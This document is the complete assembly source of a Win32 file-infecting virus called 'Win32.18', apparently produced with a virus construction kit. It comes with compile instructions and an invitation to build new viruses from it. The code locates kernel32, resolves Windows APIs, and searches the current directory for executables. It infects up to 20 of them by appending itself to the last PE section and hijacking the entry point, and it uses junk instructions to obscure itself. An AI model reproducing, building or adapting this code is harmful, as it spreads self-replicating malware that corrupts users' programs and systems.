              
;
;
; Win32.18 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.18
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 18
;  Infection Type         : increasing last section
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 37
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
 pop ebx
                                        ; mov ebp, ebx
 mov ebp, ebx
 add ecx, ebx                           ; Trash
 jmp KernelSearchStart


;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg edx, ecx

 push edx
 push esi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov esi, offset WIN32_FIND_DATA
 add esi, ebp

 push esi
                                        ; clear edx
 mov edx, -50154d
 add edx, 50154d
 add edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov eax, 276
 mov eax, 0
 add eax, 276d
 mov edx, ebp
 add edx, offset WFD_szFileName


ClearOldData2:
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 sub edx, -1d
 dec eax
 jnz ClearOldData2
 popad
ret





;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; mov eax, -1
 mov eax, -1d
 and eax, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov ebx, [eax+3Ch]
 add ebx, eax
                                        ; get File Alignment
 mov ecx, [ebx+3Ch]
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], eax
 mov dword ptr [ebp+AlignReg2], ecx
 call Align
                                        ; clear eax
 xor eax, eax
 xor eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 push eax
 pop dword ptr [ebp+WFD_nFileSizeLow]
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, esi
 add edx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
                                        ; clear esi
 and esi, 0
 add esi, edx
                                        ; get last section
                                        ; clear eax
 mov eax, 0
 mov ax, word ptr [esi+06h]
 add eax, -1
 imul eax, eax, 28h
 add edx, eax
                                        ; add edx, 120
 add edx, 120d
 mov eax, dword ptr [esi+74h]
 clc
 rcl eax, 3
 add edx, eax
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], eax
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 xor dword ptr [ebp+OldEIP], eax
 mov eax, [edx+10h]
                                        ; mov ecx, eax
 push eax
 pop ecx
 add eax, [edx+14h]
 rcl ebx, 26d                           ; Trash
 push eax
 push ecx
 pop ebx
 add ebx, [edx+0Ch]
 mov dword ptr [ebp+NewEIP], ebx
 xor dword ptr [ebp+Trash1], ebx        ; Trash
                                        ; save new enty point in file
 mov dword ptr [esi+28h], ebx
                                        ; clear ebx
 xor ebx, ebx

 add ebx, [edx+10h]
 push ebx
                                        ; calculate new section size
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], ebx
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 sub dword ptr [ebp+Trash1], eax        ; Trash
 call Align
                                        ; clear ebx
 sub ebx, ebx
 add ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [edx+10h], ebx
 pop ebx
 add ebx,  (VirusSize-1286d)
 add ebx, 1286d
 mov dword ptr [edx+08h], 0
 add dword ptr [edx+08h], ebx
 mov ebx, dword ptr [edx+0Ch]
 add ebx, dword ptr [edx+10h]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], ebx
                                        ; set write, read and code flag
 or dword ptr [edx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], '18'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov ecx, VirusSize
 mov esi, offset Virus
 add esi, ebp


AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 pop ecx
 add ecx, -1
 mov dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 stc
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov edx, 80000000h or 40000000h
 push edx
 lea eax, [ebp+WFD_szFileName]
 xchg ecx, eax

 push ecx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx
 push 0
 shl ebx, 7d                            ; Trash
 push ecx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
 cmp eax, 0
 je CloseFile
                                        ; clear edx
 sub edx, edx
 push ecx
 push edx
 push edx
                                        ; mov ebx, 2
 mov ebx, ( 2d xor 39d )
 xor ebx, 39d
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 add eax, -1
 add eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 MapHandle   dd 0h
 TempApisearch2 dd 0h
 OldEIP      dd 0h
 ATableVA    dd 0h
 KernelPE    dd 0h
 AlignReg1   dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 Attributes  dd 0h
 NewEIP      dd 0h
 TempAPI     dd 0h
 MapAddress  dd 0h
 counter     dw 0h
 OTableVA    dd 0h
 FindHandle  dd 0h
 AlignReg2   dd 0h
 NTableVA    dd 0h
 NewSize     dd 0h
 filemask    db '*.eXe',0

 APINames:
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'

 OldBase     dd 400000h
 db 'Virus : Win32.18 Author : SnakeByte',0
 KernelMZ    dd 0h
 FileHandle  dd 0h
 InfCounter  dd 0h

 APIOffsets:
 XGetFileAttributesA    dd 0h
 XCreateFileA           dd 0h
 XFindNextFileA         dd 0h
 XCloseHandle           dd 0h
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h
 XSetFileAttributesA    dd 0h
 XUnmapViewOfFile       dd 0h
 XMapViewOfFile         dd 0h
 XFindFirstFileA        dd 0h

 Trash1      dd 0h
 NTableTemp  dd 0h




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edx

 mov edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 add dword ptr [ebp+retBase], edi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retEIP dd 0h
 add eax,12345678h
 org $-4
 retBase dd 0h
 push eax
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea edi, [ebp+WFD_szFileName]
 xchg edi, ebx

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 mov ebx, ebp
 add ebx, offset WFD_szFileName


 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
                                        ; check for minimum filesize
 lea edx, [ebp+WFD_nFileSizeLow]
 xchg edx, ebx

 cmp dword ptr [ebx], 20000d
 jbe NoInfection
                                        ; check for maximum filesize
 cmp dword ptr [ebp+WFD_nFileSizeHigh], 0
 jne NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
                                        ; clear ebx
 xor ebx, ebx
 mov bx, word ptr [eax+3Ch]
 test ebx, ebx
 jz Notagoodfile
 push dword ptr [eax+3Ch]
 pop edx
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edx
 jb Notagoodfile
 add edx, eax
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je Goodfile2
                                        ; mov ecx, 7675
 mov ecx, ( 7675d - 30d )
 add ecx, 30d
 cmp ecx, 7675d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], '18'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 push dword ptr [ebp+Attributes]
 pop ebx
 push ebx
 lea edi, [ebp+WFD_szFileName]
 xchg ebx, edi

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 push 0
 pop edx
 mov ecx, dword ptr [ebp+AlignReg2]
 push eax
 div ecx
 sub ecx, edx
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 dec dword ptr [ebp+Trash1]             ; Trash
 popad
ret


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
                                        ; clear esi
 mov esi, 0
 add esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], esi

                                        ; clear ecx
 mov ecx, 0
 xor ecx, dword ptr [ebp+OldBase]

 push ecx
 pop dword ptr [ebp+retBase]


                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop edi
 push edi
                                        ; round to pages
 shr edi, 16d
 rol edi, 16d
                                        ; add edi, 1
 add edi, 1d
GetKernelLoop:
                                        ; clear ebx
 and ebx, 0
 dec edi
 mov bx, word ptr [edi+03ch]
 cmp bx,0f800h
 je GetKernelLoop
 cmp edi, dword ptr [edi+ebx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], edi
                                        ; add edi, 60
 inc edi
 add edi, 59d
 mov edx, [edi]
 inc edi
 sub edi, 61d
 add edx, edi
 mov [KernelPE+ebp], edx

 lea edx, [ebp+GetApis]
 xchg edx, esi

 push esi
ret

;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 mov ecx, 0
 add ecx, [eax+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 inc ecx
 add ecx, 27d
                                        ; get ATableVA
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 mov dword ptr [ebp+ATableVA], eax
                                        ; get NTableVA
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
                                        ; add ecx, 4
 add ecx, 4d
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
 mov eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 pop dword ptr [ebp+NTableTemp]
 mov edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [eax]
                                        ; mov eax, edx
 push edx
 pop eax
                                        ; mov ebx, eax
 mov ebx, eax
 push ebx
 pop dword ptr [ebp+TempApisearch2]
 push edi
 cld

                                        ; ebx Points to API-Name ( Kernel )
                                        ; edi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
                                        ; clear edx
 mov edx, 0
 add edx, dword ptr [edi]
 LoopChsksm:
                                        ; clear ecx
 xor ecx, ecx
 mov cl, byte ptr [ebx]
                                        ; add ebx, 1
 inc ebx
 shl cx,8d
 sub edx, ecx
 test cx, cx
 jz LoopConti
                                        ; clear ecx
 mov ecx, 42884d
 sub ecx, 42884d
 mov cl, byte ptr [ebx]
 sub edx, ecx
                                        ; add ebx, 1
 inc ebx
 or cx, cx
 jnz LoopChsksm
LoopConti:
 or edx, edx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edi
                                        ; mov eax, -1
 mov eax, ( -1d - 30d )
 add eax, 30d
 and eax, dword ptr [ebp+NTableTemp]
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+TempApisearch2]
                                        ; add eax, 4
 inc eax
 add eax, 3d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2002h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
 movzx ebx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 xchg ebx, ecx
 movzx ebx, word ptr [ecx]
 shl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ebx]
 add eax, dword ptr [ebp+KernelMZ]
 sal edx, 14d                           ; Trash
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop edx

                                        ; load API Names and Offsets
 mov ecx, ebp
 add ecx, offset APIOffsets

 lea ebx, [ebp+APINames]
 xchg edi, ebx


GetApisLoop: 

                                        ; search 'em
                                        ; edi points to the CRC
                                        ; ecx points to the offset
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 call SearchAPI1
                                        ; add edi, 4
 dec edi
 add edi, 5d
 mov ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [ecx], -1
 and dword ptr [ecx], ebx
                                        ; add ecx, 4
 add ecx, 4d
 sub edx, 1
 jnz GetApisLoop
 mov edx, offset Outbreak
 add edx, ebp

 push edx
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov esi, ebp
 add esi, offset filemask

                                        ; Set Infection Counter
                                        ; mov edi, 20
 push 20d
 pop edi
 mov dword ptr [ebp+InfCounter], edi
                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 add eax, 1d
 test eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

